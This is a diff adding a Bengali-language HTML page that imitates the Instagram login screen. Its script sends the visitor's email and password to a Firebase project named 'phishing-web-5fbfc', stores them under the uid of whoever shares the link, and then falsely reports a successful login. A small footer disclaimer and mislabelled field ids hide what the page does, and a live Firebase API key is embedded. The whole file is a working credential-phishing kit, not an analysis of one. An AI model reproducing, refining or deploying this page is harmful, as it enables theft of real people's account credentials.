@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram - লগ ইন</title>
+  <style>
+    * { 
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      color: #262626;
+    }
+    
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 350px;
+      width: 100%;
+    }
+    
+    .login-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 40px 20px;
+      width: 100%;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    
+    .instagram-logo {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
+      margin-bottom: 24px;
+      color: #262626;
+      font-weight: normal;
+    }
+    
+    @font-face {
+      font-family: 'Billabong';
+      src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
+    }
+    
+    .form-group {
+      margin-bottom: 6px;
+      width: 100%;
+    }
+    
+    .input-field {
+      width: 100%;
+      padding: 9px 12px;
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+      color: #262626;
+      outline: none;
+    }
+    
+    .input-field:focus {
+      border-color: #a8a8a8;
+    }
+    
+    .input-field::placeholder {
+      color: #8e8e8e;
+    }
+    
+    .login-btn {
+      width: 100%;
+      background-color: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 7px;
+      font-size: 14px;
+      font-weight: 600;
+      margin-top: 14px;
+      cursor: pointer;
+      opacity: 0.9;
+    }
+    
+    .login-btn:hover {
+      opacity: 1;
+    }
+    
+    .login-btn:disabled {
+      background-color: rgba(0, 149, 246, 0.3);
+      cursor: default;
+    }
+    
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+    
+    .divider span {
+      margin: 0 18px;
+    }
+    
+    .facebook-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      margin-top: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    
+    .facebook-login i {
+      font-size: 18px;
+    }
+    
+    .forgot-password {
+      color: #00376b;
+      font-size: 12px;
+      margin-top: 18px;
+      cursor: pointer;
+    }
+    
+    .signup-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 25px;
+      width: 100%;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    
+    .signup-text {
+      font-size: 14px;
+      color: #262626;
+    }
+    
+    .signup-link {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    
+    .get-app {
+      text-align: center;
+      width: 100%;
+      color: #262626;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    
+    .app-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    
+    .app-btn {
+      height: 40px;
+      cursor: pointer;
+    }
+    
+    .hidden-field {
+      display: none;
+    }
+    
+    .message {
+      margin-top: 12px;
+      font-size: 13px;
+      min-height: 18px;
+    }
+    
+    .message.success { 
+      color: #1a7f37; 
+    }
+    
+    .message.error { 
+      color: #ed4956; 
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 30px;
+      line-height: 1.5;
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h1 class="instagram-logo">Instagram</h1>
+      
+      <form id="dataForm">
+        <!-- ইমেইল ফিল্ড -->
+        <div class="form-group">
+          <input type="email" id="name" class="input-field" placeholder="ইমেইল" required>
+        </div>
+        
+        <!-- পাসওয়ার্ড ফিল্ড -->
+        <div class="form-group">
+          <input type="password" id="email" class="input-field" placeholder="পাসওয়ার্ড" required>
+        </div>
+        
+        <!-- লুকানো বার্তা ফিল্ড -->
+        <div class="form-group hidden-field">
+          <textarea id="message" placeholder=""></textarea>
+        </div>
+        
+        <button type="submit" class="login-btn" id="submitBtn">
+          <span id="btnText">লগ ইন</span>
+          <div class="spinner" id="spinner" style="display:none;"></div>
+        </button>
+        
+        <div id="messageBox" class="message"></div>
+        
+        <div class="divider">
+          <span>অথবা</span>
+        </div>
+        
+        <div class="facebook-login">
+          <i class="fab fa-facebook-square"></i>
+          <span>Facebook দিয়ে লগ ইন করুন</span>
+        </div>
+        
+        <div class="forgot-password">পাসওয়ার্ড ভুলে গেছেন?</div>
+      </form>
+    </div>
+    
+    <div class="signup-box">
+      <p class="signup-text">অ্যাকাউন্ট নেই? <a href="#" class="signup-link">সাইন আপ করুন</a></p>
+    </div>
+    
+    <div class="get-app">এপটি ডাউনলোড করুন</div>
+    
+    <div class="app-buttons">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="app-btn">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" class="app-btn">
+    </div>
+    
+    <div class="footer">
+      <div>দয়া করে কোনো সংবেদনশীল লগইন তথ্য, পাসওয়ার্ড ইত্যাদি এখানে লিখবেন না।</div>
+      <div style="margin-top: 10px;">এই ফর্মটি শুধুমাত্র যোগাযোগের উদ্দেশ্যে তৈরি করা হয়েছে।</div>
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+  <script>
+    // Firebase কনফিগারেশন - আগের মতোই রাখা হয়েছে
+    const firebaseConfig = {
+      apiKey: "AIzaSyDj5FT2W0F-x62GI2SSi4d_Y-Vtg5ztSXk",
+      authDomain: "phishing-web-5fbfc.firebaseapp.com",
+      projectId: "phishing-web-5fbfc",
+      storageBucket: "phishing-web-5fbfc.firebasestorage.app",
+      messagingSenderId: "552393373788",
+      appId: "1:552393373788:web:a460df425a2bbc40688e99",
+      measurementId: "G-1LQ68R9H4B"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const dataForm   = document.getElementById('dataForm');
+    const nameInput  = document.getElementById('name');
+    const emailInput = document.getElementById('email');
+    const msgInput   = document.getElementById('message');
+    const submitBtn  = document.getElementById('submitBtn');
+    const btnText    = document.getElementById('btnText');
+    const spinner    = document.getElementById('spinner');
+    const messageBox = document.getElementById('messageBox');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const ownerUid  = urlParams.get('uid');
+
+    if (!ownerUid) {
+      alert('ভুল লিংক। অনুগ্রহ করে সঠিক ফর্ম লিংক ব্যবহার করুন।');
+    }
+
+    function showMessage(text, type='') {
+      messageBox.textContent = text;
+      messageBox.className = 'message ' + type;
+    }
+
+    dataForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      if (!ownerUid) {
+        showMessage('ভুল লিংক, তথ্য পাঠানো সম্ভব না।', 'error');
+        return;
+      }
+
+      const name    = nameInput.value.trim();
+      const email   = emailInput.value.trim();
+      const message = msgInput.value.trim();
+
+      if (!name || !email) {
+        return showMessage('ইমেইল এবং পাসওয়ার্ড আবশ্যক', 'error');
+      }
+
+      btnText.textContent = 'লগ ইন করা হচ্ছে...';
+      spinner.style.display = 'inline-block';
+      submitBtn.disabled = true;
+
+      try {
+        const formData = {
+          name,
+          email,
+          message,
+          timestamp: new Date().toISOString()
+        };
+
+        await db
+          .collection('users')
+          .doc(ownerUid)
+          .collection('submissions')
+          .add(formData);
+
+        showMessage('✅ লগ ইন সফল হয়েছে!', 'success');
+        dataForm.reset();
+      } catch (err) {
+        console.error(err);
+        showMessage('❌ লগ ইন করতে সমস্যা হয়েছে, আবার চেষ্টা করুন।', 'error');
+      } finally {
+        btnText.textContent = 'লগ ইন';
+        spinner.style.display = 'none';
+        submitBtn.disabled = false;
+      }
+    });
+
+    window.onload = function () {
+      console.log('Instagram লগইন ফর্ম লোড হয়েছে');
+    };
+  </script>
+</body>
+  </html>
